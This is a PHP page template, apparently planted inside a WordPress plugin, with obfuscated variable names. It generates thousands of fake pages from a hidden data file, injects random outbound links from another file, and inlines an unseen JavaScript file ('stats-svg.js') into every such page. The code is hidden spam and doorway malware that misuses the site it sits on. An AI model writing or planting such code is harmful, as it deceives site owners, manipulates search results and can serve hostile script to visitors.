<?php
$oFVS5XeMGI = intval(get_query_var('abaxgxv'));

if ($oFVS5XeMGI < 1 || $oFVS5XeMGI > 5495) return;
$kRdzM = file(plugin_dir_path(__FILE__).'endpoints-code.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$vafiG = explode(';', $kRdzM[$oFVS5XeMGI]);
if (count($vafiG) < 2) return;
$yDmAOgX = $vafiG[0];
$hS2Kx2F  = $vafiG[1];
$y0GTAcab = $vafiG[2];
$ufIhq06d  = $vafiG[3];
$gMMlFG = $vafiG[4];
set_query_var('lxmnhnp', $yDmAOgX);

$mFzopY = '';
$gTTIunlL74 = plugin_dir_path(__FILE__).'wall-real.php';
if (is_file($gTTIunlL74)) {
	$t3miw1R1Hv = file($gTTIunlL74, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($t3miw1R1Hv);
	shuffle($t3miw1R1Hv);
	$bXrB0 = mt_rand(2, 5);
	if (count($t3miw1R1Hv) > $bXrB0) {
		for ($xAlloTaB6l = 0; $xAlloTaB6l < $bXrB0; $xAlloTaB6l++) {
			$w8GV9CT6l = array_shift($t3miw1R1Hv);
			$mFzopY .= '<p><a href="'.$w8GV9CT6l.'">'.$w8GV9CT6l.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $yDmAOgX; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $hS2Kx2F . "</p>\n";
				if (strlen($ufIhq06d) > 0) echo "<p>" . $ufIhq06d . "</p>\n";
				if (strlen($y0GTAcab) > 0) echo "<p>" . $y0GTAcab . "</p>\n";
				if (strlen($gMMlFG) > 0) echo '<p><a href="#"><img src="'.$gMMlFG.'"></a>' . "</p>\n";
				echo $mFzopY;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$frdjOm = plugin_dir_path(__FILE__) . 'stats-svg.js';
if (is_file($frdjOm)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($frdjOm);
	echo '</script>';
}
get_footer();
?>
